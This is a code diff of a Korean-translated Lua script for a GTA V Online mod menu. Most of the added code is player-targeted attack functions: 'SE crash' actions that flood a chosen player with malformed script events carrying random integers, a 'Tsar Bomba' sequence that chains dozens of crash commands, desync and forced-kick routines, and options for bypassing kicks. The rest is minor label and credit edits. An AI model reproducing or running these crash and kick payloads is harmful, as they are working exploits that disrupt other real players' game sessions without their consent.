+        util.trigger_script_event(1 << player_id, {1926582096, 0, -1, -1, -1, 18899, 1011, 3070})
+        util.trigger_script_event(1 << player_id, {1926582096, 0, -4640169, 0, 0, 0, -36565476, -53105203})
+        util.trigger_script_event(1 << player_id, {1033875141, -17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691})
+        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 93})
+        util.yield(25)
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 37, 0, -7})
+        util.trigger_script_event(1 << player_id, {-1881357102, 0, 0, -13, 0, 0, 0, 23})
+        util.trigger_script_event(1 << player_id, {153488394, 0, 868904806, 0, 0, 7, 7, 19, 0, 0, 1, 0, -23, -27})
+        util.trigger_script_event(1 << player_id, {1249026189})
+        util.trigger_script_event(1 << player_id, {315658550})
+        util.trigger_script_event(1 << player_id, {-877212109})
+        util.trigger_script_event(1 << player_id, {1033875141, 0, 0, 0, 82})
+        util.trigger_script_event(1 << player_id, {1926582096})
+        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
+        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
+        util.yield(25)
+        util.trigger_script_event(1 << player_id, {-2043109205, 0, 0, 3333, 0, 0, 0, -987, 21369})
+        util.trigger_script_event(1 << player_id, {-988842806, 0, 0, 2222, 0, 0, 0, -109, 73322})
+        util.trigger_script_event(1 << player_id, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
+        util.trigger_script_event(1 << player_id, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
+        util.trigger_script_event(1 << player_id, {-1730227041, -494, 1526, 60541, -12988, -99097, -32105})
+    end)
+
+
     -- This is a Prisuhm crash fixed by me <3
 
     local krustykrab = menu.list(twotake, "돈 캉그레호", {}, "관전은 위험합니다. 2T1 사용자에게 적용됩니다.")
@@ -1394,7 +1757,111 @@ players.on_join(function(player_id)
         end)
     end)
 
-    --menu.action(crashes, "말할 수 없는 V4 'Test'", {"crashv4"}, "지금 당장 고쳐야 한다", function()
+    local secrashes = menu.list(crashes, "SE 크래쉬", {}, "")
+
+    menu.action(secrashes, "SE 크래쉬 (S0)", {"crashv20"}, "스크래쉬 스크립트", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
+            end
+            util.yield()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561, player_id, math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
+            end
+        util.trigger_script_event(1 << player_id, {-555356783, 26, -589330767, 40106, 44698, 114444756, -1221859636, 78561})
+    end)
+
+    menu.action(secrashes, "SE 크래쉬 (S1)", {"crashv21"}, "스크래쉬 스크립트", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+            end
+            util.yield()
+            for i = 1, 15 do
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, player_id, math.random(int_min, int_max)})
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+            end
+            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
+    end)
+
+    menu.action(secrashes, "SE 크래쉬 (S2)", {"crashv22"}, "스크래쉬 스크립트", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+            end
+            util.yield()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17, player_id, math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+            end
+        util.trigger_script_event(1 << player_id, {495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+    end)
+
+    menu.action(secrashes, "SE 크래쉬 (S3)", {"crashv23"}, "스크래쉬 스크립트", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
+            end
+            util.yield()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528, player_id, math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
+            end
+        util.trigger_script_event(1 << player_id, {1348481963, 0, -124605528})
+    end)
+
+    menu.action(secrashes, "SE 크래쉬 (S4)", {"crashv24"}, "스크래쉬 스크립트", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
+            end
+            util.yield()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1, player_id, math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
+                end
+        util.trigger_script_event(1 << player_id, {-1178972880, 1, 3, 8, 1, 1, 1})
+    end)
+
+    menu.action(secrashes, "SE 크래쉬 (S7)", {"crashv25"}, "스크래쉬 스크립트", function()
+        local int_min = -2147483647
+        local int_max = 2147483647
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
+            end
+            util.yield()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736, player_id, math.random(int_min, int_max)})
+                util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
+            end
+        util.trigger_script_event(1 << player_id, {-1529596656, 26, -547323955, -1612886483, -275646172, -879183487, 1221401895, -1674954067, 198848784, 495735107, 0, -1998972833, -129810361, 1888307736})
+    end)
+
+    --menu.action(crashes, "Inbloqueable V4 'Test'", {"crashv4"}, "Deberia estar arreglado por ahora", function()
     --    local mdl = util.joaat("apa_mp_apa_yacht")
     --    local user = PLAYER.PLAYER_PED_ID()
     --    local ped_pos = players.get_position(player_id)
@@ -1574,6 +2041,16 @@ players.on_join(function(player_id)
         menu.trigger_commands("crashv10"..players.get_name(player_id))
         util.yield(800)
         menu.trigger_commands("crashv11"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv12"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv13"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv14"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv15"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv16"..players.get_name(player_id))
         -- Turned off because of a self-crash error
         --util.yield(600)
         --menu.trigger_commands("crashv4"..players.get_name(player_id))
@@ -1590,8 +2067,100 @@ players.on_join(function(player_id)
         util.yield(600)
         menu.trigger_commands("flashcrash"..players.get_name(player_id))
         util.yield(1800)
-        util.toast("Espera en lo que se limpia todo...")
+        util.toast("모든 것이 씻겨 내려갈 때까지 기다려라...")
         --menu.trigger_command(outSync, "off")
+        menu.trigger_commands("rlag3"..players.get_name(player_id))
+        menu.trigger_commands("rcleararea")
+        menu.trigger_commands("potatomode off")
+        menu.trigger_commands("trafficpotato off")
+        util.yield(8000)
+        menu.trigger_commands("anticrashcamera off")
+    end)
+
+    menu.action(crashes, "차르 폭탄 V4", {"tsarbomba4"}, "PC 충돌, 좋은 PC가 없으면 사용하지 않는 것이 좋습니다(차단 불가 uwu) \n(잘 작동하려면 일반 필요/과부하 가능성이 매우 높음)", function()
+        local objective = player_id
+        --local outSync = menu.ref_by_path("Outgoing Syncs>Block")
+        menu.trigger_commands("anticrashcamera on")
+        menu.trigger_commands("potatomode on")
+        menu.trigger_commands("trafficpotato on")
+        util.toast("시작 중...")
+        util.toast("가난한 사람")
+        menu.trigger_commands("rlag3"..players.get_name(player_id))
+        util.yield(1000)
+        menu.trigger_commands("rlag"..players.get_name(player_id))
+        util.yield(2500)
+        menu.trigger_commands("crashv1"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv2"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv3"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv4"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv5"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv6"..players.get_name(player_id))
+        util.yield(600)
+        menu.trigger_commands("crashv7"..players.get_name(player_id))
+        util.yield(700)
+        menu.trigger_commands("crashv8"..players.get_name(player_id))
+        util.yield(700)
+        menu.trigger_commands("crashv9"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv10"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv11"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv12"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv13"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv14"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv15"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv16"..players.get_name(player_id))
+        util.yield(800)
+        menu.trigger_commands("crashv17"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv18"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv19"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv20"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv21"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv22"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv23"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv24"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv25"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv27"..players.get_name(player_id))
+        util.yield(100)
+        menu.trigger_commands("crashv26"..players.get_name(player_id))
+        util.yield(2000)
+        menu.trigger_commands("crash"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("ngcrash"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("footlettuce"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("steamroll"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("choke"..players.get_name(player_id))
+        util.yield(400)
+        menu.trigger_commands("flashcrash"..players.get_name(player_id))
+        util.yield(1800)
+        util.toast("모든 것이 씻겨 내려갈 때까지 기다려라...")
+        util.yield(1000)
+        util.toast("우리는 당신의 메뉴얼을 되찾고 있습니다...")
+        --menu.trigger_command(outSync, "off")
+        menu.trigger_commands("rlag3"..players.get_name(player_id))
+        menu.trigger_commands("rlag"..players.get_name(player_id))
         menu.trigger_commands("rcleararea")
         menu.trigger_commands("potatomode off")
         menu.trigger_commands("trafficpotato off")
@@ -1640,7 +2209,52 @@ players.on_join(function(player_id)
         end)
     end
 
-    local sekicks = menu.list(kicks, "스크립트 킥", {}, "")
+    menu.action(kicks, "디싱크 킥 'Test'", {}, "", function()
+        util.request_model(0x705E61F2)
+        local pos = ENTITY.GET_ENTITY_COORDS(ped)
+        local ped_ = entities.create_ped(1, 0x705E61F2, pos, 0, true, false)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 0, 0, 0, 39, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 1, 104, 25, -1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 2, 49, 0, -1, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 3, 33, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 4, 84, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 5, 82, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 6, 33, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 7, 0, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 8, 97, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 9, 0, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 10, 0, 0, 0)
+        PED.SET_PED_COMPONENT_VARIATION(ped_, 11, 186, 0, 0)
+        util.trigger_script_event(-227800145 << player_id, {player_id, math.random(32, 23647483647), math.random(-23647, 212347), 1, 115, math.random(-2321647, 21182412647), math.random(-2147483647, 2147483647), 26249, math.random(-1257483647, 23683647), 2623, 25136})
+    end)
+
+    menu.action(kicks, "스탠드 비 호스트 킥 'Test'", {}, "", function()
+		util.trigger_script_event(-371781708 << player_id, {player_id, player_id, player_id, 1403904671})
+		util.trigger_script_event(-317318371 << player_id, {player_id, player_id, player_id, 1993236673})
+		util.trigger_script_event(911179316 << player_id, {player_id, player_id, player_id, player_id, 1234567990, player_id, player_id})
+		util.trigger_script_event(846342319 << player_id, {player_id, 578162304, 1})
+		util.trigger_script_event(-2085853000 << player_id, {player_id, player_id, 1610781286, player_id, player_id})
+		util.trigger_script_event(-1991317864 << player_id, {player_id, 3, 935764694, player_id, player_id})
+		util.trigger_script_event(-1970125962 << player_id, {player_id, player_id, 1171952288})
+		util.trigger_script_event(-1013679841 << player_id, {player_id, player_id, 2135167326, player_id})
+		util.trigger_script_event(-1767058336 << player_id, {player_id, 1459620687})
+		util.trigger_script_event(-1892343528 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
+		util.trigger_script_event(1494472464 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
+		util.trigger_script_event(69874647 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
+		util.trigger_script_event(998716537 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
+		util.trigger_script_event(522189882 << player_id, {player_id, player_id, math.random(-2147483647, 2147483647)})
+		util.trigger_script_event(1514515570 << player_id, {player_id, player_id, 2147483647})
+		util.trigger_script_event(296518236 << player_id, {player_id, player_id, player_id, player_id, 1})
+		util.trigger_script_event(-1782442696 << player_id, {player_id, 420, 69})
+		for i = 1, 5 do
+			util.trigger_script_event(-1782442696 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
+		end
+		util.trigger_script_event(924535804 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
+		util.trigger_script_event(436475575 << player_id, {player_id, math.random(-2147483647, 2147483647), 0})
+    end)
+
+
+    local sekicks = menu.list(kicks, "스크립트에 의한 킥", {}, "")
 
     menu.action(sekicks, "스크립트 킥 v1", {}, "", function()
         util.trigger_script_event(1 << player_id, {111242367, player_id, -210634234})
@@ -2293,10 +2907,26 @@ players.on_join(function(player_id)
         local is_running = VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(player_vehicle)
         if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle) then
             VEHICLE.SET_VEHICLE_ENGINE_HEALTH(player_vehicle, -10.0)
-            util.toast(players.get_name(player_id) .. " Motor jodido")
+            util.toast(players.get_name(player_id) .. " 엔진 고장")
         else
-            util.toast(" 차량을 제어할 수 없거나 플레이어가 차량에 있지 않습니다.")
+            util.toast("차량을 제어할 수 없거나 플레이어가 차량에 있지 않습니다.")
         end
+    end)
+
+    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    -- Other
+
+    menu.action(otherc, "마르카 델 게이머", {}, "플레이어가 가지고 있는 마크를 지도에 표시해야 합니다.", function()    
+        local playerw = players.get_waypoint(player_id)
+        for i = 1, 5 do
+            HUD.REFRESH_WAYPOINT()
+        end
+        HUD.SET_NEW_WAYPOINT(playerw.x, playerw.y, false)
+        util.yield(2000)
+        util.toast("La marca del jugador ya deberia estar en el mapa.")
+        util.yield(500)
+        util.toast("Tal vez no tenga marca si no sale.")
+
     end)
 
 
@@ -2525,7 +3155,7 @@ menu.toggle_loop(detections, "텔레포트", {}, "플레이어가 텔레포트�
     end
 end)
 
-menu.toggle_loop(detections, "스마트킥 'Test'", {}, "그는 그들이 매우 빨리 회의에서 누군가를 추방하는 것에 투표하는지 감지하고 경고합니다.  스탠드업 스마트 킥으로 더 잘 알려져 있습니다.", function()
+menu.toggle_loop(detections, "스마트 킥 'Test'", {}, "그는 그들이 매우 빨리 회의에서 누군가를 추방하는 것에 투표하는지 감지하고 경고합니다.  스탠드업 스마트 킥으로 더 잘 알려져 있습니다.", function()
     for _, player_id in ipairs(players.list(false, true, true)) do
         local kickowner = NETWORK.NETWORK_SESSION_GET_KICK_VOTE(player_id)
         local kicked = NETWORK.NETWORK_SESSION_KICK_PLAYER(player_id)
@@ -2704,7 +3334,7 @@ menu.click_slider(coleccionables, "융크 에너지 자유 비행", {""}, "", 0,
     util.trigger_script_event(1 << players.user(), {0xB9BA4D30, 0, 0xA, i, 1, 1, 1})
 end)
 
-local bypasskick = menu.list(online, "킥 우회술", {}, "만약 그들이 당신을 막고 있다면, 회의에 들어가기 위해 모든 수단을 사용할 수 있는 옵션들.")
+local bypasskick = menu.list(online, "바이패스 킥", {}, "만약 그들이 당신을 막고 있다면, 회의에 들어가기 위해 모든 수단을 사용할 수 있는 옵션들.")
 
 menu.divider(bypasskick, "일반 방법")
 
@@ -2891,6 +3521,9 @@ menu.toggle(protects, "팬코 모드", {"panic"}, "이것은 어떤 대가를 �
         menu.trigger_command(UnblockNetEvents)
         menu.trigger_commands("anticrashcamera off")
     end
+end)
+
+menu.toggle_loop(protects, "블루콰이어 크래시호스/킥", {}, "메뉴 보호를 활성화하여 크라슈나 킥을 차단하도록 하십시오.", function(on)
 end)
 
 
@@ -3269,11 +3902,14 @@ end
 --    end
 --end
 
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+-- Real Helicopter Mode Start
+
 get_vtable_entry_pointer = function(address, index)
     return memory.read_long(memory.read_long(address) + (8 * index))
 end
 get_sub_handling_types = function(vehicle, type)
-    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x938)
+    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
     local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
     local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
     local types = {registerd = sub_handling_count, found = 0}
@@ -3324,6 +3960,7 @@ menu.action(realheli, "실제 헬리콥터 모드", {"betterheli"}, "실제 작�
     end
 end)
 
+-- Real Helicopter Mode End
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 --Impulse SportMode start
 
@@ -3759,25 +4396,29 @@ menu.hyperlink(menu.my_root(), "디스코드 참여!", "https://discord.gg/BNbSH
 local credits = menu.list(misc, "크레딧", {}, "")
 local devcred = menu.list(credits, "크레딧 개발", {}, "")
 local othercred = menu.list(credits, "오트로스 크레도스", {}, "")
-menu.action(devcred, "JinxScript/Prisuhm", {}, "prisuhm의 스키드 코드, 이것은 내가 그와 약간의 토론을 하기 전에 추가한 것입니다. 그가 훌륭하고 거의 모든 단일 기능을 코딩했기 때문에 우리는 이 커뮤니티에서 그를 사랑합니다. \n너무 Prisumm하고 독특해서 감사합니다.", function()
+menu.action(devcred, "JinxScript/Prisuhm", {}, "prisuhm의 스키드 코드, 이것은 내가 그와 약간의 토론을 하기 전에 추가한 것입니다. 우리는 그가 굉장하고 거의 모든 단일 기능을 코딩했기 때문에 이 커뮤니티에서 그를 사랑합니다. \n고유하고 독특해서 감사합니다.", function()
 end)
 menu.action(devcred, "gLance", {}, "그는 나에게 Gta V 네이티브들에게 많은 도움을 주었다.", function()
 end)
 menu.action(devcred, "LanceScriptTEOF", {}, "그는 내가 Gta V 네이티브를 배우고 이해하도록 도왔습니다.", function()
 end)
-menu.action(devcred, "Aaron", {}, "Stand lua api의 첫 단계를 도와주셔서 감사합니다.", function()
+menu.action(devcred, "Aaron", {}, "스탠드 루아 API의 첫 단계를 도와주셔서 감사합니다.", function()
 end)
-menu.action(devcred, "Cxbr", {}, "친숙한 기능을 위한 Thx <3", function()
+menu.action(devcred, "Cxbr", {}, "친숙한 기능을 위한 <3", function()
 end)
 menu.action(devcred, "Sapphire", {}, "내 멍청한 두뇌 때문에 거의 모든 기능과 인내심을 가지고 나를 도운 사람 <3", function()
 end)
-menu.action(othercred, "Emir, Joju, Pepe, Ady, Vicente, Sammy", {}, "이것은 그들 없이는 결코 가능하지 않을 것입니다 <3", function()
+menu.action(devcred, "candypie", {}, "기능을 테스트하고 일부 스크립트 이벤트를 추가하는 데 도움이 됩니다.", function()
 end)
-menu.action(othercred, "Wigger", {}, "그는 스크립트와 일부 기능에 몇 가지 아이디어를 가져왔습니다.", function()
+menu.action(othercred, "Emir, Joju, Pepe, Ady, Vicente, Sammy", {}, "이것은 그들 없이는 절대 불가능할 것이다. <3", function()
 end)
-menu.action(othercred, "Ducklett", {}, "그는 스크립트를 영어로 완전히 번역했습니다.", function()
+menu.action(othercred, "Wigger", {}, "그는 대본에 몇 가지 아이디어와 몇 가지 기능을 가져왔다.", function()
 end)
-menu.action(othercred, "You <3", {}, "스크립트를 다운로드하고 개선을 위한 아이디어를 제공하는 사람 <3", function()
+menu.action(othercred, "Ducklett", {}, "그는 대본을 완전히 영어로 번역했다.", function()
+end)
+menu.action(othercred, "HADES", {}, "그는 대본을 한국어로 완전히 번역했다.", function()
+end)
+menu.action(othercred, "You <3", {}, "스크립트를 다운로드하고 개선을 위한 아이디어를 제공하는 사용자 <3", function()
 end)
 
 util.on_stop(function ()
